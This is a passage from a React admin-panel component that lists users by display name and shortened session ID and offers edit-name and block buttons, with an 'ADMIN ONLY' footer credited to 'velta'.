                          </Button>
                        </div>
                      ) : (
                        <div>
                          <span className="text-sm font-medium text-slate-300">{user.displayName}</span>
                          <span className="text-[10px] font-mono ml-2 text-slate-700">{user.sessionId.substring(0, 8)}</span>
                        </div>
                      )}
                    </div>
                    <div className="flex items-center gap-1">
                      {editingUser !== user.id && (
                        <Button
                          size="icon"
                          variant="ghost"
                          onClick={() => { setEditingUser(user.id); setEditName(user.displayName); }}
                          className="text-indigo-400/50"
                          data-testid={`button-edit-${user.id}`}
                        >
                          <Pencil className="w-3.5 h-3.5" />
                        </Button>
                      )}
                      <Button
                        size="icon"
                        variant="ghost"
                        onClick={() => blockUser(user.id)}
                        className="text-red-400/50"
                        data-testid={`button-block-${user.id}`}
                      >
                        <UserX className="w-3.5 h-3.5" />
                      </Button>
                    </div>
                  </div>
                </div>
              ))
            )}
          </div>
        )}

        <div className="flex items-center justify-between py-4 text-[10px] tracking-widest text-slate-700">
          <span>ADMIN ONLY</span>
          <span data-testid="text-credits">made by velta</span>
        </div>
      </div>
    </div>
  );
}
